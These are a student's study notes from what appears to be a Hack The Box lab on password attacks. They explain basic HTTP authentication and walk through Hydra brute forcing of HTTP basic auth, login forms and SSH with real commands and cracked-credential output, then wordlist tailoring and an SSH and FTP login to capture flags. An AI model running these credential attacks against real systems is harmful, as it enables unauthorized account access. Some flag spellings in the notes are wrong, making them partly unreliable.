## Brute forcing basic HTTP auth

## Password Attacks:

- HTTP specification provides :
    1. Basic HTTP AUTH → is used to authenticate user to the HTTP server
    2. Proxy server AUTH → is used to authenticate user to intermediate proxy server
- when the client comes to send a request the request pathes through ( proxy server ) then ( main server which is ( HTTP server)) and the proxy server forwards the request to the http server and the http server then answers by a respond .
- there is an authentication part for each of Proxy-server and HTTP server .
- PRoXY-server-auth : the proxy server asks fro credintials to send the request to the http server or by another meaning forward the request to the http server .
- and in the HTTP server there is authentication .
- HTTP-server-auth: it asks for the second credintials to answer the request that is just forwarded to it .
- the http-server-auth-credintials : are in the www-authenticate header field , and they are user id , user password . when the user first ask for a responese by sending a request the http server sends back a authentication request that asks for the www-authentication header .
- the client response for the server authentication request is in the base64 method for encoding the identifier (id ) and password and those two encoded data strings are sent to the http server as a respond for his authentication request if they are right the serve will answer by a response for them that will contain the web page content that we were asking for .

## so now we will brute force for the password and id :

### password attacks type :

- Dictionary attack
- brute force
- traffic interception
- man in the middle
- key logging
- social engineering
- we will mainly focus on the brute force , dictionary attacks both the brute force and dictionary attacks will find the pass, id by brute forcing service .

## brute force attack

- the methodology of working of the brute force is about the factor of the length and then after knowing the length of the input field required .
- However, even if we only use lowercase English characters, this would have almost half a million permutations -`26x26x26x26 = 456,976`-, which is a huge number, even though we only have a password length of `4`.
- due to that brute force will take a very long time and in some cases like upper with lower with symbols and number these password to be brute forced can take years so in these case we lean to use Dictionary Attacks but the bad thing about dictionary attack is if the password is not exactly on the dictionary it will not get it .

  

## Dictionary Attack

- dictionary attack tries to get the password but using lists of known passwords to gues the unknown password .
- we can find alot of wordlists for alot of attaks in [SecLists](https://github.com/danielmiessler/SecLists) repo.

## methods of brute force attacks

1. ==online brute force attack :==
2. ==offline brute force attack :== also known as offline password cracking , where we attempt to crack a hash of an encrypted password .
3. ==Reverse brute force attack:== we choose a password and fix it and then we start to try this fixed password with a list of usernames on a certain service .
4. ====Hybrid brute Force Attack :==== we attack the user that we already know or the service that we have info about and we make a special wordlist of passwords for that user or company or service and then we try it .

## Brute force for default passwords

## HYDRA

hydra is very handy for the login pages

to install hydra `apt install hydra -y`

`hydra -h` open help menu .

|   |   |
|---|---|
|**Options**|**Description**|
|`-C credintialsWordlistPath`|Combined Credentials Wordlist|
|`SERVER_IP`|Target IP|
|`-s PORT`|Target Port|
|`http-get`|Request Method|
|`/`|Target Path|

the command :

```
-c /tools/Seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
```

```
output:
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://178.211.23.155:31099/
[31099][http-get] host: 178.211.23.155   login: test   password: testingpw
[STATUS] attack finished for 178.211.23.155 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

so in hydra it is written in the form of :

```
hydra  -c /wordlistname.txt 94.237.53.115 -s 37235  http-git / 
```

  

## Username Brute Force

### wordlists:

rockyou.txt contains 14 million unique password.

`/home/joyhunter/tools/SecLists-master/Passwords/rockyou.txt`

  

for the passwords : rockyou.txt

for the UserNames : Names.tx

hydra always requires at least 3 specific flags if the whole credintials are in one single list to performm a brute force attack against a web service :

1. credentials
2. Target Host
3. Target Path

and in case the credintials are in two different files not compined together as a user:password then use flag `-L` for the username.list `-p` for the password.list.path

we can use also `-U` so that it also tries all users in each password instead of the reverse only .

we can brute force passwords for the `test` user by adding `-l test`, and then adding a password word list with `-P rockyou.txt`.

```
KareemAlsadeq@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task
[DATA] attacking http-get://178.35.49.134:32901/

[32901][http-get] host: 178.35.49.134   login: abbas   password: amormio
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

  

## Web Forms Brute Forcing:

## Hydra Modules

- many admin panels have a b374k shell that allow OS commands execution directly.

### Login.php

- a very necessary thing while bruteforcing is to try to cause a little network traffic as possible to not get into trouples or blocked .
- in case we have admin pannel login page which happens in our exam we will use 10 most popular administrators credentials.
- if non of the admin most popular administrator credentials worked we can use another widespread attack method called ( password spraying) .
- Password Spraying method is based on prefounded passwords for these service as a simple example if we have two panels we may find that the same user used the same credentials for them both.

  

### Brute Forcing Forms

Q: what is brute forcing Forms ?

A: pages of login.php or .aspx or whatever are called login forms and brute forcing forms brute force login forms .

which is diff from that one when the server asked us for the headers as a request as we saw in the exam first login header that makes use enter the login form .

  

```
KareemAlsadeq@htb[/htb]$ hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e

Supported			        ldap3[-{cram|digest}md5][s]	rsh
services			        memcached					rtsp
				            mongodb						s7-300
adam6500			        mssql						sip
asterisk			        mysql						smb
cisco				        nntp						smtp[s]
cisco-enable		        oracle-listener				smtp-enum
cvs				            oracle-sid					snmp
firebird			        pcanywhere					socks5
ftp[s]				        pcnfs						ssh
http[s]-{head|get|post}		pop3[s]						sshkey
http[s]-{get|post}-form		postgres					svn
http-proxy		        	radmin2						teamspeak
http-proxy-urlenum		    rdp				  		    telnet[s]
icq				            redis						vmauthd
imap[s]		        		rexec						vnc
irc				            rlogin						xmpp
ldap2[s]		        	rpcap
```

to find out how to use a specific Hydra module we write `hydra name_module -U`

ex:

```
hydra http-post-form -U
```

output:

```
KareemAlsadeq@htb[/htb]$ hydra http-post-form -U<...SNIP...>
Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
First is the page on the server to GET or POST to (URL).
Second is the POST/GET variables ...SNIP... usernames and passwords being replaced in the
 "^USER^" and "^PASS^" placeholders
The third is the string that it checks for an *invalid* login (by default)
 Invalid condition login check can be preceded by "F=", successful condition
 login check must be preceded by "S=".

<...SNIP...>

Examples:
 "/login.php:user=^USER^&pass=^PASS^:incorrect"
```

output summary:

we need to provide 3 parameters separated by ( : )

1. url path
2. post parameter
3. a failed or success login string that will tell hydra and make it recognize when the login attempt is successful or not.

so the final result will look like this :

`hydra urlpath:postparameter:string`

so the url for our example is /login.php

the second parameter is the post parameters for username/passwords

and it is written in the form of

`[]=^^ & []=^^`

like this

`[user parameter]=^USER^&[password parameter]=^PASS^`

and the compination between the first 2 parameters will be :

ideal:

```
hydra urlpath:postparameter:string
```

implementation:

```
hydra /login.php:[user parameter]=^PASS^&[password parameter]=^PASS^
```

- and now we will use the Fail/success ( string ) which is the third parameter .
    
    if we provide hydra a fail string : it will keep looking untill the fail string is not in the respond .
    
    if we provide hydra a success string it will keep looking untill the success string appears in the respond .
    
    We can specify two different types of analysis that act as a Boolean value.
    
    |   |   |   |
    |---|---|---|
    |**Type**|**Boolean Value**|**Flag**|
    |`Fail`|FALSE|`F=html_content`|
    |`Success`|TRUE|`S=html_content`|
    
    If we provide a `fail` string, it will keep looking until the string is **not found** in the response. Another way is if we provide a `success` string, it will keep looking until the string is **found** in the response.
    
    Since we cannot log in to see what response we would get if we hit a `success`, we can only provide a string that appears on the `logged-out` page to distinguish between logged-in and logged-out pages.
    
    So, let's look for a unique string so that if it is missing from the  
    response, we must have hit a successful login. This is usually set to  
    the error message we get upon a failed login, like `Invalid Login Details`.  
    However, in this case, it is a little bit trickier, as we do not get  
    such an error message. So is it still possible to brute force this login  
    form?
    
    We can take a look at our login page and try to find a string that  
    only shows in the login page, and not afterwards. For example, one  
    distinct string is `Admin Panel`:
    
    [![](https://academy.hackthebox.com/storage/modules/57/web_fnb_admin_login_1.jpg)](https://academy.hackthebox.com/storage/modules/57/web_fnb_admin_login_1.jpg)
    
    So, we may be able to use `Admin Panel` as our fail string. However, this may lead to false-positives because if the `Admin Panel` also exists in the page after logging in, it will not work, as `hydra` will not know that it was a successful login attempt.
    
    A better strategy is to pick something from the HTML source of the login page.
    
    What we have to pick should be very _unlikely_ to be present after logging in, like the **login button** or the _password field_.  
    Let's pick the login button, as it is fairly safe to assume that there  
    will be no login button after logging in, while it is possible to find  
    something like `please change your password` after logging in.
    
    We can click `[Ctrl + U]` in Firefox to show the HTML page source, and search for `login`:
    
    Code: html
    
    ```
      <form name='login' autocomplete='off' class='form' action='' method='post'>
    ```
    
    We see it in a couple of places as title/header, and we find our  
    button in the HTML form shown above. We do not have to provide the  
    entire string, so we will use `<form name='login'`, which should be distinct enough and will probably not exist after a successful login.
    
    So, our syntax for the `http-post-form` should be as follows:
    
    Code: bash
    
    ```
    "/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"
    ```
    
      
    

## Determine Login Parameters

it will take about determining the login parameters

we can do that simply by seeing the request .

`username=admin&password=admin`

so to use it in hydra it will be :

`[username]=^USER^&[password]=^PASS^`

as we can see the written in small is login and in capatal is PASS because it is not written as a wholle word .

To use in a `hydra http-post-form`, we can take it as is, and replace the username/password we used `admin:admin` with `^USER^` and `^PASS^`. The specification of our final target path should be as follows:

Code: bash

```
"/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

  

## Login Form Attacks

here we are going to talk about the login form attacks

Q: didnot we talk about it before ?

A: Yes, but here we will put it in work

so lets put it in work …

the way of writting the command will be as following

```
hydra -c wordlistpath ip -s port http-post-form "url:username=^USER^&password=^PASS^:F=<form name='login'"
```

```
KareemAlsadeq@htb[/htb]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login'

[PORT][http-post-form] host: 178.35.49.134   login: admin   password: password123
[STATUS] attack finished for 178.35.49.134 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

  

`l` small

`-f` small

`-s` small

only the `-P` , `-C` are big

this is the correct way for hydra flags

always use :^USER^ not :^Login^ to avoid errors

## Personalized Wordlists

to create a personalized wordlist for the user

saw the password policy when we logged in, we know that the password must meet the following conditions:

1. 8 characters or longer
2. contains special characters
3. contains numbers

So, we can remove any passwords that do not meet these conditions from our wordlist.  
Some tools would convert password policies to `Hashcat` or `John` rules, but `hydra` does not support rules for filtering passwords. So, we will simply use the following commands to do that for us:

Code: bash

```
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
```

We see that these commands shortened the wordlist from 43k passwords to around 13k passwords, around 70% shorter.

---

## Mangling

It is still possible to create many permutations of each word in that  
list. We never know how our target thinks when creating their password,  
and so our safest option is to add as many alterations and permutations  
as possible, noting that this will, of course, take much more time to  
brute force.

Many great tools do word mangling and case permutation quickly and easily, like [rsmangler](https://github.com/digininja/RSMangler) or [The Mentalist](https://github.com/sc0tfree/mentalist.git).  
These tools have many other options, which can make any small wordlist  
reach millions of lines long. We should keep these tools in mind because  
we might need them in other modules and situations.

As a starting point, we will stick to the wordlist we have generated  
so far and not perform any mangling on it. In case our wordlist does not  
hit a successful login, we will go back to these tools and perform some  
mangling to increase our chances of guessing the password.

Tip: The more mangled a wordlist is, the more chances  
you have to hit a correct password, but it will take longer to brute  
force. So, always try to be efficient, and properly customize your  
wordlist using the intelligence you gathered.

💡

we used cupp -i to make a custom pass list

💡

we used username-anarchy to make custom userName list

  

## Service Authentication Brute Forcing

we will learn how to brute force into ( service authentication )

Q: what is Service Authentication , how it diff from normal login form ?

A: Service Authentication verifies the identity of applications or systems to other services, often using API keys, tokens, or certificates. In contrast, a normal login form is for human users and typically relies on a username and password.

### SSH secure shell

The command used to attack a login service is fairly straightforward.  
We simply have to provide the username/password wordlists, and add `service://SERVER_IP:PORT` at the end. As usual, we will add the `-u -f` flags. Finally, when we run the command for the first time, `hydra` will suggest that we add the `-t 4` flag for a max number of parallel attempts, as many `SSH`  
limit the number of parallel connections and drop other connections,  
resulting in many of our attempts being dropped. Our final command  
should be as follows:

```
KareemAlsadeq@htb[/htb]$ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 157116 login tries (l:12/p:13093), ~39279 tries per task
[DATA] attacking ssh://178.35.49.134:22/
[STATUS] 77.00 tries/min, 77 tries in 00:01h, 157039 to do in 33:60h, 4 active
[PORT][ssh] host: 178.35.49.134   login: b.gates   password: ...SNIP...
[STATUS] attack finished for 178.35.49.134 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

💡

imp notes :

so we used -L user.txt

-P pass.txt

-U

-f to stop at first success credentials

ssh://ip:port

-t 4 makes it only four attempts parallel to each other

  

after brute forcing the ssh service for the targeted ip with hydra and know the correct user:pass we will go on and ssh - ing

```
ssh user@ip -p port
```

so as we saw to attempt to ssh using those credintials for that ip address at that port we will use them as following :

`ssh b.gates@``178.35.49.134 -p 22`

then it will ask for the password : ********

b.gates@bruteforcing:~$

as we saw we will find a secure shell for the target opened on the terminal via the brute forced credintials that we made using our personalized lists of user : pass

via the tools cupp for the password and username-anarachy for the username.

  

  

### task :

1. we have the lists ( -l bill.txt)( -p william.txt)
2. we will first start by nmap the ip target we will find 21,22 ports open
3. we will target the ssh 22 port that will be the user b.gates
4. we will then start by this command :
    
    ```
    hydra -l b.gates -P william.txt ssh://94.237.56.76:36375 -f -t 4 
    ```
    
    we will get password `4dn1l3M!$` from this then we will use those credentials to open a secure shell in the target
    
    ```
    ssh b.gates@94.237.56.76 -p 22
    ```
    
    then we will use ls to see the files we have
    
    and then we will ls the home directory to see the users in the home directory
    
      
    
5. we will find a flag in the secure shell at the home directory
6. we will go into the other user after that by the ftp login we will find its name and hydra will be in the secure shell of b.gates
7. we will use the command
    
    ```
    hydra -l (user_name) -P rockyou-10.txt ftp://127.0.0.1
    ```
    
    after that we will have the user:pass for the other user and we will use them to open change the user b.gates to that user using the command
    
    ```
    su - (user_name)
    ```
    
    then we will cd to the home direcotry and cat the flag.txt